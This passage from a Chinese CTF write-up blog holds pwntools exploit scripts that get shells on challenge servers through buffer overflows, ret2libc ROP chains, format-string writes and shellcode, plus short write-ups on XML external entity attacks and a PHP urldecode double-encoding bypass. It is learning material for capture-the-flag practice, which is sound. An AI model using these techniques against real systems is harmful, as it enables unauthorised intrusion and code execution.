<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line">p = remote(<span class="string">"111.198.29.45"</span>,<span class="number">54738</span>)</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"secret[0] is "</span>)</span><br><span class="line">v3 = p.recvline().strip(<span class="string">"\n"</span>)</span><br><span class="line">v3_add = int((<span class="string">"0x"</span> + str(v3)),<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> v3_add</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"What should your character's name be:\n"</span>)</span><br><span class="line">p.sendline(<span class="string">"a"</span>)</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"So, where you will go?east or up?:\n"</span>)</span><br><span class="line">p.sendline(<span class="string">"east"</span>)</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"o into there(1), or leave(0)?:\n"</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"'Give me an address'\n"</span>)</span><br><span class="line">p.sendline(str(v3_add))</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"And, you wish is:\n"</span>)</span><br><span class="line">payload = <span class="string">"%85c%7$n"</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"Wizard: I will help you! USE YOU SPELL\n"</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"><span class="keyword">print</span> shellcode</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>注意：！！！！！</p>
<p>在写shellcode的时候最好加一下context</p>
<h1 id="8"><a href="#8" class="headerlink" title="8"></a>8</h1><h3 id="srand"><a href="#srand" class="headerlink" title="srand()"></a>srand()</h3><p>​        srand()为初始化随机数发生器，用于设置rand()产生随机数时的种子。传入的参数seed为unsigned  int类型，通常我们会使用time(0)或time(NULL)的返回值作为seed。</p>
<h3 id="rand"><a href="#rand" class="headerlink" title="rand()"></a>rand()</h3><p>​        rand()函数是使用线性同余法做的，它并不是真的随机数，因为其周期特别长，所以在一定范围内可以看成随机的。<br>​         rand()函数不需要参数，它将会返回0到RAND_MAX之间的任意的整数。</p>
<p>这里用到了python与c语言交互的一个库</p>
<p>关于ctype库与dll<br>我们使用python标准库中自带的ctypes模块进行python和c的混合编程<br>libc共享库<br>可以使用ldd查找</p>
<p>注意，我们在使用sendlineafter()函数的时候不可以加上\n，这样的话是无法识别的</p>
<p>同时输入的为字符串形式</p>
<p>上exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process("./1")</span></span><br><span class="line">p = remote(<span class="string">"111.198.29.45"</span>,<span class="number">38308</span>)</span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment">#print p.recvuntil("Your name:\n")</span></span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">32</span> + p64(<span class="number">1</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"name:"</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">"number:"</span>,str(libc.rand()%<span class="number">6</span> + <span class="number">1</span>))</span><br><span class="line"><span class="keyword">print</span> p.recvall()</span><br></pre></td></tr></table></figure>

<h1 id="9-整数溢出"><a href="#9-整数溢出" class="headerlink" title="9 整数溢出"></a>9 整数溢出</h1><p>知识点：整数溢出</p>
<p>详情见自己写的博客或ctf_wiki</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="comment">#Author:summerN</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">"111.198.29.45"</span>,<span class="number">51446</span>)</span><br><span class="line"><span class="comment">#p = process("./1")</span></span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"Your choice:"</span>)</span><br><span class="line">payload1 = <span class="string">"1"</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"Please input your username:\n"</span>)</span><br><span class="line">payload2 = <span class="string">"summerN"</span></span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"Please input your passwd:\n"</span>)</span><br><span class="line">payload3 = <span class="string">"a"</span> * (<span class="number">0x14</span> + <span class="number">4</span>) + p32(<span class="number">0x804868b</span>)</span><br><span class="line">payload3 = payload3.ljust(<span class="number">259</span>,<span class="string">'b'</span>) <span class="comment">#范围</span></span><br><span class="line">p.sendline(payload3)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> p.recvall()</span><br></pre></td></tr></table></figure>

<h2 id="10"><a href="#10" class="headerlink" title="10"></a>10</h2><p>一个通过栈溢出漏洞使用write函数泄露libc基地址的题目</p>
<p>libc文件题目已经给出</p>
<p>获取基地址后基本的rop</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="comment">#__author__='summerN@DL&amp;S'</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">file_name = <span class="string">'./level3'</span></span><br><span class="line">libc_name = <span class="string">'libc_32.so.6'</span></span><br><span class="line"><span class="comment">#libc_name = '/lib/i386-linux-gnu/libc.so.6'</span></span><br><span class="line">ip = <span class="string">'111.198.29.45'</span></span><br><span class="line">port = <span class="string">'42539'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.arch = 'amd64'</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.terminal=[<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">libc = ELF(libc_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"><span class="comment">#p = process(file_name)</span></span><br><span class="line">p = remote(ip,port)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x88</span></span><br><span class="line">libc_got = elf.got[<span class="string">"__libc_start_main"</span>]</span><br><span class="line"><span class="comment">#print libc_got</span></span><br><span class="line">write_plt = elf.plt[<span class="string">"write"</span>]</span><br><span class="line">main = <span class="number">0x8048484</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">"a"</span> * (offset + <span class="number">4</span>) + p32(write_plt) + p32(main)  <span class="comment">#此处的main未返回地址</span></span><br><span class="line">payload1 +=   p32(<span class="number">1</span>) + p32(libc_got) + p32(<span class="number">4</span>)<span class="comment">#使用write泄露libc基地址</span></span><br><span class="line"><span class="keyword">print</span> payload1</span><br><span class="line">p.recvuntil(<span class="string">"Input:\n"</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#p.recvuntil('@\n')</span></span><br><span class="line">write_add = u32(p.recv(<span class="number">4</span>).strip(<span class="string">"\n"</span>).ljust(<span class="number">4</span>,<span class="string">"\x00"</span>))</span><br><span class="line"><span class="keyword">print</span> hex(write_add)</span><br><span class="line"></span><br><span class="line">libc_add = write_add - libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">sys_add = libc_add + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">bin_add = libc_add + libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">"a"</span> * (offset + <span class="number">4</span>) + p32(sys_add) + <span class="string">'aaaa'</span> + p32(bin_add)</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"Input:\n"</span>) </span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>安恒月赛暨北京工业大学</title>
    <url>/2019/12/21/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B%E6%9A%A8%E5%8C%97%E4%BA%AC%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6/</url>
    <content><![CDATA[<h1 id="安恒月赛暨北京工业大学"><a href="#安恒月赛暨北京工业大学" class="headerlink" title="安恒月赛暨北京工业大学"></a>安恒月赛暨北京工业大学</h1><a id="more"></a>

<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="1-fantasy"><a href="#1-fantasy" class="headerlink" title="1.fantasy"></a>1.fantasy</h3><p>简单的栈溢出</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="comment">#__author__='summerN@DL&amp;S'</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">file_name = <span class="string">'./fantasy'</span></span><br><span class="line">libc_name = <span class="string">''</span></span><br><span class="line">ip = <span class="string">'183.129.189.60'</span></span><br><span class="line">port = <span class="string">'10025'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.arch = 'amd64'</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.terminal=[<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line"><span class="comment">#libc = ELF(libc_name)</span></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">p = remote(ip,port)</span><br><span class="line">offset = <span class="number">0x30</span></span><br><span class="line">sys_add = <span class="number">0x400735</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span> * (offset + <span class="number">8</span>) + p64(sys_add)</span><br><span class="line">p.recvuntil(<span class="string">"input your message\n"</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="2-how-do-cannary-work"><a href="#2-how-do-cannary-work" class="headerlink" title="2.how do cannary work"></a>2.how do cannary work</h3><p>这个题没有cannary保护</p>
<p>但是有挨千杀的出题人写的canary</p>
<p>这个cannary是由malloc传入的</p>
<p>用过gdb调试后发现是由两个变量比较</p>
<p>其中一个变量引入的是地址</p>
<p>另一个变量保存了进行check的字符串</p>
<p>我们只需找一个内存为0的地址传入，之后覆盖掉另一个变量为0即可</p>
<p>剩下的即为简单rop，调用puts泄露libc之后rop</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="comment">#__author__='summerN@DL&amp;S'</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">file_name = <span class="string">'./my_cannary'</span></span><br><span class="line">libc_name = <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">ip = <span class="string">'183.129.189.60'</span></span><br><span class="line">port = <span class="string">'10026'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.arch = 'amd64'</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.terminal=[<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line"><span class="comment">#libc = ELF(libc_name)</span></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"><span class="comment">#p = process(file_name)</span></span><br><span class="line">p = remote(ip,port)</span><br><span class="line">offset = <span class="number">0x40</span></span><br><span class="line"><span class="comment">#puts_plt = elf.plt['puts']</span></span><br><span class="line">puts_plt = <span class="number">0x400670</span></span><br><span class="line"><span class="keyword">print</span> puts_plt</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line"><span class="keyword">print</span> puts_got</span><br><span class="line">pop_add = <span class="number">0x400a43</span></span><br><span class="line">main_add = <span class="number">0x400998</span></span><br><span class="line">backdoor = <span class="number">0x000000000600fe8</span> <span class="comment">#地址指向为0</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">"a"</span> * <span class="number">0x30</span> + p64(backdoor) + p64(<span class="number">0x0</span>) + <span class="string">"a"</span> * <span class="number">8</span> + p64(pop_add) + p64(puts_got) + p64(puts_plt) + p64(main_add)</span><br><span class="line">p.recvuntil(<span class="string">"n\n"</span>)</span><br><span class="line"><span class="comment">#payload1 = "a" * (offset + 8) + p64(pop_add) + p64(puts_got) + p64(puts_plt) + p64(main_add)</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print p.recvall()</span></span><br><span class="line">put_add = u64(p.recvline().strip(<span class="string">"\n"</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line"><span class="keyword">print</span> put_add</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">"puts"</span>,put_add)</span><br><span class="line">libc_add = put_add - libc.dump(<span class="string">"puts"</span>)</span><br><span class="line">sys_add = libc_add + libc.dump(<span class="string">"system"</span>)</span><br><span class="line">bin_add = libc_add + libc.dump(<span class="string">"str_bin_sh"</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"n\n"</span>)</span><br><span class="line">payload2 = <span class="string">"a"</span> * <span class="number">0x30</span> + p64(backdoor) + p64(<span class="number">0x0</span>) + <span class="string">"a"</span> * <span class="number">8</span> + p64(pop_add)</span><br><span class="line">payload2 += p64(bin_add) + p64(sys_add)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>SWPUCTF</title>
    <url>/2019/12/16/SWPUCTF/</url>
    <content><![CDATA[<h1 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h1><a id="more"></a>

<p>先check</p>
<p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1575638684522.png" alt="1575638684522"></p>
<p>还可以、</p>
<p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1575638774113.png" alt="1575638774113"></p>
<p>这个题涉及了bss段的格式化字符串把漏洞，需要通过改写栈上的地址来挟持返回地址，之后再改写我们想输入的字符串（bin/sh）</p>
<p>难度在于</p>
<p>1.查找libc版本</p>
<p>2.改写链的地址</p>
<p>3.对于改写的话需要一个一个字节的去改写，具体看脚本</p>
<p> <a href="C:\Users\Administrator\Desktop\login.py">login.py</a> </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="comment">#__author__='pumpkin9@DL&amp;S'</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># context(log_level='debug',terminal=['tmux','split','-h'],arch='amd64')</span></span><br><span class="line"></span><br><span class="line">file_name = <span class="string">'./login'</span></span><br><span class="line">libc_name = <span class="string">'/lib/i386-linux-gnu/libc.so.6'</span></span><br><span class="line">ip = <span class="string">'108.160.139.79'</span></span><br><span class="line">port = <span class="string">'9090'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.arch = 'amd64'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level='debug'</span></span><br><span class="line"></span><br><span class="line">context.terminal=[<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">lib = ELF(libc_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">p = process(file_name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = remote(ip,int(port))</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> name,x : log.info(name+<span class="string">':0x%x'</span>%x)</span><br><span class="line">ls = <span class="keyword">lambda</span> name,x : log.success(name+<span class="string">':0x%x'</span>%x)</span><br><span class="line"></span><br><span class="line">key = <span class="string">"wllmmllw"</span></span><br><span class="line">p.sendlineafter(<span class="string">"Please input your name: \n"</span>,<span class="string">"pumpkin9"</span>)</span><br><span class="line">payload = <span class="string">"%15$p"</span></span><br><span class="line">p.sendlineafter(<span class="string">"password: \n"</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">"This is the wrong password: "</span>)</span><br><span class="line">libc = int(p.recvuntil(<span class="string">"\n"</span>,<span class="literal">True</span>),<span class="number">16</span>)<span class="number">-241</span>-lib.symbols[<span class="string">'__libc_start_main'</span>]<span class="comment">#获取libc基地址</span></span><br><span class="line">ls(<span class="string">"libc addr"</span>,libc)</span><br><span class="line">onegg = libc + lib.symbols[<span class="string">'system'</span>]<span class="comment">#获取system地址</span></span><br><span class="line">ls(<span class="string">"one_gadget"</span>,onegg)</span><br><span class="line">binsh = libc + lib.search(<span class="string">'/bin/sh'</span>).next()<span class="comment">#获取bin/sh地址</span></span><br><span class="line">ls(<span class="string">"sh addr"</span>,binsh)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Try again!\n"</span>)</span><br><span class="line">p.sendline(<span class="string">"%6$p"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"This is the wrong password: "</span>)</span><br><span class="line">stack = int(p.recvuntil(<span class="string">"\n"</span>,<span class="literal">True</span>),<span class="number">16</span>)<span class="comment">#获取的是ebp中的内容</span></span><br><span class="line">target = stack <span class="number">-12</span> <span class="comment">#这个的计算结果为返回地址</span></span><br><span class="line">ls(<span class="string">"stack addr"</span>,stack)</span><br><span class="line">ls(<span class="string">"target addr"</span>,target)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">num = target&amp;<span class="number">0xff</span><span class="comment">#进行按位与运算目的是除去多余的位数，在这里是保留后12位</span></span><br><span class="line"></span><br><span class="line">data1 = <span class="number">0x100</span><span class="comment">#onegg&amp;0xff</span></span><br><span class="line">data2 = (onegg&amp;<span class="number">0xffff</span>)&gt;&gt;<span class="number">8</span> <span class="comment">#右移位运算获取第二个字符位</span></span><br><span class="line">data3 = (onegg&amp;<span class="number">0xffffff</span>)&gt;&gt;<span class="number">16</span><span class="comment">#获取第三个字符位</span></span><br><span class="line">data4 = onegg&gt;&gt;<span class="number">24</span><span class="comment">#获取第四个字符位</span></span><br><span class="line">li(<span class="string">"sys1"</span>,data1)</span><br><span class="line">li(<span class="string">"sys2"</span>,data2)</span><br><span class="line">li(<span class="string">"sys3"</span>,data3)</span><br><span class="line">li(<span class="string">"sys3"</span>,data4)</span><br><span class="line">data5 = binsh&amp;<span class="number">0xff</span><span class="comment">#同data1-4的作用</span></span><br><span class="line">data6 = ((binsh&amp;<span class="number">0xffff</span>)&gt;&gt;<span class="number">8</span>)</span><br><span class="line">data7 = ((binsh&amp;<span class="number">0xffffff</span>)&gt;&gt;<span class="number">16</span>)</span><br><span class="line">data8 = binsh&gt;&gt;<span class="number">24</span></span><br><span class="line">li(<span class="string">"sh1"</span>,data5)</span><br><span class="line">li(<span class="string">"sh2"</span>,data6)</span><br><span class="line">li(<span class="string">"sh3"</span>,data7)</span><br><span class="line">li(<span class="string">"sh4"</span>,data8)</span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,<span class="string">"%"</span>+str(num)+<span class="string">"c%6$hhn"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,<span class="string">"%"</span>+str(data1)+<span class="string">"c%10$hhn"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,<span class="string">"%"</span>+str(num+<span class="number">1</span>)+<span class="string">"c%6$hhn"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,<span class="string">"%"</span>+str(data2)+<span class="string">"c%10$hhn"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,<span class="string">"%"</span>+str(num+<span class="number">2</span>)+<span class="string">"c%6$hhn"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,<span class="string">"%"</span>+str(data3)+<span class="string">"c%10$hhn"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,<span class="string">"%"</span>+str(num+<span class="number">3</span>)+<span class="string">"c%6$hhn"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,<span class="string">"%"</span>+str(data4)+<span class="string">"c%10$hhn"</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,<span class="string">"%"</span>+str(num+<span class="number">8</span>)+<span class="string">"c%6$hhn"</span>)<span class="comment">#参数放到返回地址后面即可</span></span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,<span class="string">"%"</span>+str(data5)+<span class="string">"c%10$hhn"</span>)<span class="comment">#但是为什么要间隔四个字节呢</span></span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,<span class="string">"%"</span>+str(num+<span class="number">9</span>)+<span class="string">"c%6$hhn"</span>)<span class="comment">#对于32位的程序根据libc中的system一般都要这样</span></span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,<span class="string">"%"</span>+str(data6)+<span class="string">"c%10$hhn"</span>)<span class="comment">#先记住</span></span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,<span class="string">"%"</span>+str(num+<span class="number">10</span>)+<span class="string">"c%6$hhn"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,<span class="string">"%"</span>+str(data7)+<span class="string">"c%10$hhn"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,<span class="string">"%"</span>+str(num+<span class="number">11</span>)+<span class="string">"c%6$hhn"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,<span class="string">"%"</span>+str(data8)+<span class="string">"c%10$hhn"</span>)</span><br><span class="line"><span class="comment">#raw_input('#')</span></span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,key)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>web狗之xml实体攻击</title>
    <url>/2019/12/16/web%E7%8B%97%E4%B9%8Bxml%E5%AE%9E%E4%BD%93%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<h2 id="web狗之xml实体攻击浅学"><a href="#web狗之xml实体攻击浅学" class="headerlink" title="web狗之xml实体攻击浅学"></a>web狗之xml实体攻击浅学</h2><a id="more"></a>

<p>我们先来了解一下xml</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;chybeta&lt;&#x2F;to&gt;</span><br><span class="line">&lt;from&gt;ph0en1x&lt;&#x2F;from&gt;</span><br><span class="line">&lt;&#x2F;note&gt;</span><br><span class="line">在上面代码中的第一行，定义XML的版本与编码。</span><br><span class="line"></span><br><span class="line">在XML文档中，所有的元素都必须正确的嵌套，形成树形结构。并且整个XML文档中必须要有一个根元素。如上代码，&lt;note&gt;是整个文档的根元素。嵌套在note标签中的&lt;to&gt;和&lt;from&gt;则是根的子元素。</span><br><span class="line"></span><br><span class="line">同时，所有的XML元素都必须有关闭标签，这点不像html语法那样松散。如果缺失关闭标签，则会导致XML解析失败。</span><br><span class="line">我们再了解一下实体：</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">所有的XML文档都由五种简单的构建模块（元素，属性，实体，PCDATA CDATA）构成。这里着重介绍一下实体：实体是用于定义引用普通文本或特殊字符的快捷方式的变量，实体引用是对实体的引用。实体可在内部或外部进行声明。因此我们利用引入实体，构造恶意内容，从而达到攻击的目的。</span><br><span class="line">实体类型：</span><br><span class="line">XML实体分为四种：字符实体，命名实体，外部实体，参数实体。</span><br></pre></td></tr></table></figure>
<p>文档类型定义：DTD</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">简单的说，DTD的作用是定义XML文档的合法构建模块。如前所述，实体也是构建模块之一。因此可以利用DTD来内部或外部引入实体。</span><br><span class="line"></span><br><span class="line">其基本格式：</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE 根元素名 [ 元素描述 ]&gt;</span><br></pre></td></tr></table></figure>
<p>内部引入<br>格式：</p>
<!ENTITY 实体名称 "实体的值">

<p>将DTD和XML放在同一份文档中，利用DTD定义的实体即为内部实体。<br>例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ENTITY chybeta &quot;Hello World!&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;xxe&gt;</span><br><span class="line">&amp;chybeta;</span><br><span class="line">&lt;&#x2F;xxe&gt;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">访问该XML文档，&amp;chybeta;会被解析为Hello World!并输出。</span><br></pre></td></tr></table></figure>


<p>外部引入<br>基本格式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">通过引用定义在外部的DTD中的实体，我们称之为外部实体。</span><br></pre></td></tr></table></figure>
<p>之后呢，我们通过jarvis上的一道web题来尝试一下：<br><a href="http://web.jarvisoj.com:9882/" target="_blank" rel="noopener">http://web.jarvisoj.com:9882/</a><br>我们先进行一下抓包<br><img src="https://img-blog.csdnimg.cn/20190405211355937.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>之后呢我们发现第一个红箭头的位置，使用的是json方式传入<br>我们改为xml，之后编写代码进行传入<br><img src="https://img-blog.csdnimg.cn/20190405211630967.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>go后我们得到flag<br><img src="https://img-blog.csdnimg.cn/20190405211650164.png" alt="在这里插入图片描述"><br>小白，还请多多关照</p>
]]></content>
  </entry>
  <entry>
    <title>urldecode二次编码绕过</title>
    <url>/2019/12/16/urldecode%E4%BA%8C%E6%AC%A1%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<h2 id="代码审计日志三urldecode二次绕过"><a href="#代码审计日志三urldecode二次绕过" class="headerlink" title="代码审计日志三urldecode二次绕过"></a>代码审计日志三urldecode二次绕过</h2><a id="more"></a>

<p>题目：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(eregi(&quot;hackerDJ&quot;,$_GET[id])) &#123;</span><br><span class="line">echo(&quot;</span><br><span class="line"></span><br><span class="line">not allowed!</span><br><span class="line">&quot;);</span><br><span class="line">exit();</span><br><span class="line">&#125;</span><br><span class="line">$_GET[id] &#x3D; urldecode($_GET[id]);</span><br><span class="line">if($_GET[id] &#x3D;&#x3D; &quot;hackerDJ&quot;)</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;</span><br><span class="line"></span><br><span class="line">Access granted!</span><br><span class="line">&quot;;</span><br><span class="line">echo &quot;</span><br><span class="line"></span><br><span class="line">flag</span><br><span class="line">&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>经过审计：<br>由</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$_GET[id] &#x3D; urldecode($_GET[id]);</span><br></pre></td></tr></table></figure>
<p>可知，我们需要将hackerDJ进行urldecode编码后get上传<br>我们上传后得到：<br>not allowed!<br>再看url<br>发现我们get传入的url编码值被浏览器自动解码<br>因此我们需要再一次进行编码<br>上传后得到flag</p>
]]></content>
  </entry>
  <entry>
    <title>sql语句之where字句学习笔记</title>
    <url>/2019/12/16/sql%E8%AF%AD%E5%8F%A5%E4%B9%8Bwhere%E5%AD%97%E5%8F%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
